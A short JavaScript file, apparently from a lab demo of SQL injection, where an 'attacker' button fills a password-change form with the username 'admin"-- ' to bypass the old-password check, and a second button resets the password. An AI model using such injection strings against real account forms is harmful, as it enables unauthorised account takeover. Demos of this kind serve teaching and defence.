window.onload = function() {
    const username = document.getElementById('username');
    const password_old = document.getElementById('password-old');
    const password_new = document.getElementById('password-new');
    const password_re = document.getElementById('password-re');
    
    const attacker = document.getElementById('attacker');
    attacker.onclick = () => {
        username.value = 'admin"-- ';
        password_old.value = 'secret password';
        password_new.value = '123456';
        password_re.value = '123456';
    }
    
    const change_back = document.getElementById('change-back');
    change_back.onclick = () => {
        username.value = 'admin';
        password_old.value = '123456';
        password_new.value = 'password';
        password_re.value = 'password';
    }
}
